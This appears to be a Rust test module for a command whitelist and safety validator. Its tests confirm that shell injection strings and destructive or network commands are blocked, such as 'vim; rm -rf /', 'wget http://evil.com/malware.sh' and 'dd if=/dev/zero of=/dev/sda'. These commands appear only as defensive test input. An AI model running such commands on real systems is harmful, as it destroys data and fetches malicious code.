impl std::fmt::Display for CommandCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}  {}", self.indicator(), self.as_str())
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_whitelist_not_empty() {
        assert!(!COMMAND_WHITELIST.is_empty());
        assert!(COMMAND_WHITELIST.len() >= 30); // We should have at least 30 commands
    }

    #[test]
    fn test_registry_lookup() {
        let registry = CommandRegistry::new();

        let cpu = registry.get("cpu_info");
        assert!(cpu.is_some());
        assert_eq!(cpu.unwrap().template, "lscpu -J");
        assert_eq!(cpu.unwrap().risk, CommandRisk::Low);
    }

    #[test]
    fn test_registry_by_category() {
        let registry = CommandRegistry::new();

        let hardware = registry.by_category(CommandCategory::Hardware);
        assert!(!hardware.is_empty());
        assert!(hardware.iter().any(|c| c.id == "cpu_info"));
    }

    #[test]
    fn test_build_command_simple() {
        let registry = CommandRegistry::new();

        // No parameters
        let result = registry.build_command("cpu_info", &HashMap::new());
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "lscpu -J");
    }

    #[test]
    fn test_build_command_with_params() {
        let registry = CommandRegistry::new();

        let mut params = HashMap::new();
        params.insert("package".to_string(), "vim".to_string());

        let result = registry.build_command("pkg_query", &params);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "pacman -Qi vim");
    }

    #[test]
    fn test_build_command_injection_prevention() {
        let registry = CommandRegistry::new();

        // Try to inject a command
        let mut params = HashMap::new();
        params.insert("package".to_string(), "vim; rm -rf /".to_string());

        let result = registry.build_command("pkg_query", &params);
        assert!(result.is_err());
        assert!(matches!(result, Err(WhitelistError::UnsafeParameter(_))));
    }

    #[test]
    fn test_build_command_pipe_injection() {
        let registry = CommandRegistry::new();

        let mut params = HashMap::new();
        params.insert("package".to_string(), "vim | cat /etc/passwd".to_string());

        let result = registry.build_command("pkg_query", &params);
        assert!(result.is_err());
    }

    #[test]
    fn test_build_command_backtick_injection() {
        let registry = CommandRegistry::new();

        let mut params = HashMap::new();
        params.insert("package".to_string(), "`whoami`".to_string());

        let result = registry.build_command("pkg_query", &params);
        assert!(result.is_err());
    }

    #[test]
    fn test_match_whitelist() {
        let registry = CommandRegistry::new();

        // Exact match
        let result = registry.matches_whitelist("lscpu -J");
        assert!(result.is_some());
        assert_eq!(result.unwrap().command.id, "cpu_info");

        // With parameter
        let result = registry.matches_whitelist("pacman -Qi vim");
        assert!(result.is_some());
        let m = result.unwrap();
        assert_eq!(m.command.id, "pkg_query");
        assert_eq!(m.parameters.get("package"), Some(&"vim".to_string()));
    }

    #[test]
    fn test_no_match_arbitrary_command() {
        let registry = CommandRegistry::new();

        // Arbitrary command should not match
        let result = registry.matches_whitelist("rm -rf /");
        assert!(result.is_none());

        let result = registry.matches_whitelist("wget http://evil.com/malware.sh");
        assert!(result.is_none());
    }

    #[test]
    fn test_risk_levels() {
        assert!(CommandRisk::Low.auto_approve_normal());
        assert!(!CommandRisk::Medium.auto_approve_normal());
        assert!(!CommandRisk::High.auto_approve_normal());

        assert!(CommandRisk::Low.auto_approve_dev());
        assert!(CommandRisk::Medium.auto_approve_dev());
        assert!(!CommandRisk::High.auto_approve_dev());

        assert!(!CommandRisk::Low.requires_confirmation());
        assert!(!CommandRisk::Medium.requires_confirmation());
        assert!(CommandRisk::High.requires_confirmation());
    }

    #[test]
    fn test_low_risk_commands() {
        let registry = CommandRegistry::new();
        let low_risk = registry.low_risk_commands();

        // All returned commands should be low risk
        for cmd in &low_risk {
            assert_eq!(cmd.risk, CommandRisk::Low);
        }

        // Should include common safe commands
        assert!(low_risk.iter().any(|c| c.id == "cpu_info"));
        assert!(low_risk.iter().any(|c| c.id == "mem_info"));
        assert!(low_risk.iter().any(|c| c.id == "pkg_query"));
    }

    #[test]
    fn test_high_risk_commands() {
        let registry = CommandRegistry::new();

        // Package install should be high risk
        let pkg_install = registry.get("pkg_install").unwrap();
        assert_eq!(pkg_install.risk, CommandRisk::High);

        // Service start should be high risk
        let svc_start = registry.get("svc_start").unwrap();
        assert_eq!(svc_start.risk, CommandRisk::High);
    }

    #[test]
    fn test_timeout_values() {
        let registry = CommandRegistry::new();

        // Quick commands should have short timeouts
        let cpu = registry.get("cpu_info").unwrap();
        assert!(cpu.timeout_secs <= 10);

        // Package operations can take longer
        let pkg_install = registry.get("pkg_install").unwrap();
        assert!(pkg_install.timeout_secs >= 60);
    }

    // ========================================================================
    // v0.50.0 SafeCommandValidator Tests
    // ========================================================================

    #[test]
    fn test_safety_level_properties() {
        assert!(SafetyLevel::ReadOnly.can_auto_execute());
        assert!(SafetyLevel::LowRisk.can_auto_execute());
        assert!(!SafetyLevel::Dangerous.can_auto_execute());

        assert_eq!(SafetyLevel::ReadOnly.as_str(), "read_only");
        assert_eq!(SafetyLevel::LowRisk.as_str(), "low_risk");
        assert_eq!(SafetyLevel::Dangerous.as_str(), "dangerous");
    }

    #[test]
    fn test_validator_read_only_commands() {
        let validator = SafeCommandValidator::new();

        // Basic read-only commands
        assert_eq!(validator.classify("ls -la"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("pwd"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("cat /etc/os-release"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("uname -a"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("lscpu"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("free -h"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("df -h"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("ps aux"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("hostname"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("whoami"), SafetyLevel::ReadOnly);
    }

    #[test]
    fn test_validator_dangerous_commands() {
        let validator = SafeCommandValidator::new();

        // Destructive commands
        assert_eq!(validator.classify("rm -rf /"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("rm file.txt"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("dd if=/dev/zero of=/dev/sda"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("mkfs.ext4 /dev/sda1"), SafetyLevel::Dangerous);

        // Process control
        assert_eq!(validator.classify("kill -9 1234"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("killall firefox"), SafetyLevel::Dangerous);

        // System control
        assert_eq!(validator.classify("reboot"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("shutdown -h now"), SafetyLevel::Dangerous);

        // Network downloads
        assert_eq!(validator.classify("wget http://example.com"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("curl http://example.com"), SafetyLevel::Dangerous);
    }

    #[test]
    fn test_validator_dangerous_patterns() {
        let validator = SafeCommandValidator::new();

        // Shell injection patterns
        assert_eq!(validator.classify("ls; rm -rf /"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("cat file && rm file"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("echo $(whoami)"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("ls | grep foo"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("cat file > /etc/passwd"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("cat file >> /etc/passwd"), SafetyLevel::Dangerous);
    }

    #[test]
    fn test_validator_package_queries() {
        let validator = SafeCommandValidator::new();

        // Safe pacman queries
        assert_eq!(validator.classify("pacman -Q"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("pacman -Qi vim"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("pacman -Ss vim"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("pacman --query vim"), SafetyLevel::ReadOnly);

        // Dangerous pacman operations
        assert_eq!(validator.classify("pacman -S vim"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("pacman -R vim"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("pacman --sync vim"), SafetyLevel::Dangerous);

        // Safe apt queries
        assert_eq!(validator.classify("apt show vim"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("apt search vim"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("apt list --installed"), SafetyLevel::ReadOnly);

        // Dangerous apt operations
        assert_eq!(validator.classify("apt install vim"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("apt remove vim"), SafetyLevel::Dangerous);

        // pip queries
        assert_eq!(validator.classify("pip list"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("pip show requests"), SafetyLevel::ReadOnly);

        // npm queries
        assert_eq!(validator.classify("npm list"), SafetyLevel::ReadOnly);
    }

    #[test]
    fn test_validator_systemctl() {
        let validator = SafeCommandValidator::new();

        // Safe systemctl operations
        assert_eq!(validator.classify("systemctl status sshd"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("systemctl is-active sshd"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("systemctl is-enabled sshd"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("systemctl list-units"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("systemctl show sshd"), SafetyLevel::ReadOnly);

        // Dangerous systemctl operations
        assert_eq!(validator.classify("systemctl start sshd"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("systemctl stop sshd"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("systemctl restart sshd"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("systemctl enable sshd"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("systemctl disable sshd"), SafetyLevel::Dangerous);
    }

    #[test]
    fn test_validator_tar() {
        let validator = SafeCommandValidator::new();

        // Safe tar list operations
        assert_eq!(validator.classify("tar -tf archive.tar"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("tar --list -f archive.tar"), SafetyLevel::ReadOnly);

        // Dangerous tar extract operations
        assert_eq!(validator.classify("tar -xf archive.tar"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("tar -xzf archive.tar.gz"), SafetyLevel::Dangerous);
    }

    #[test]
    fn test_validator_is_safe() {
        let validator = SafeCommandValidator::new();

        assert!(validator.is_safe("ls -la"));
        assert!(validator.is_safe("pwd"));
        assert!(validator.is_safe("cat /etc/os-release"));

        assert!(!validator.is_safe("rm -rf /"));
        assert!(!validator.is_safe("wget http://example.com"));
        assert!(!validator.is_safe("systemctl stop sshd"));
    }

    #[test]
    fn test_validator_explain_block() {
        let validator = SafeCommandValidator::new();

        // Dangerous command explanation
        let explanation = validator.explain_block("rm -rf /");
        assert!(explanation.contains("rm"));
        assert!(explanation.contains("modify") || explanation.contains("damage"));

        // Dangerous pattern explanation
        let explanation = validator.explain_block("ls; rm -rf /");
        assert!(explanation.contains(";") || explanation.contains("pattern"));

        // Empty command
        let explanation = validator.explain_block("");
        assert!(explanation.contains("Empty"));
    }

    #[test]
    fn test_validator_unknown_commands() {
        let validator = SafeCommandValidator::new();

        // Unknown commands should be treated as dangerous
        assert_eq!(validator.classify("totally_unknown_cmd"), SafetyLevel::Dangerous);
        assert_eq!(validator.classify("my_custom_script.sh"), SafetyLevel::Dangerous);
    }

    #[test]
    fn test_validator_ollama() {
        let validator = SafeCommandValidator::new();

        // Ollama commands should be read-only
        assert_eq!(validator.classify("ollama list"), SafetyLevel::ReadOnly);
        assert_eq!(validator.classify("ollama ps"), SafetyLevel::ReadOnly);
    }

    #[test]
    fn test_validator_low_risk() {
        let validator = SafeCommandValidator::new();

        // Low-risk commands (create only, no overwrite)
        assert_eq!(validator.classify("touch newfile.txt"), SafetyLevel::LowRisk);
        assert_eq!(validator.classify("mkdir new_dir"), SafetyLevel::LowRisk);
    }
}
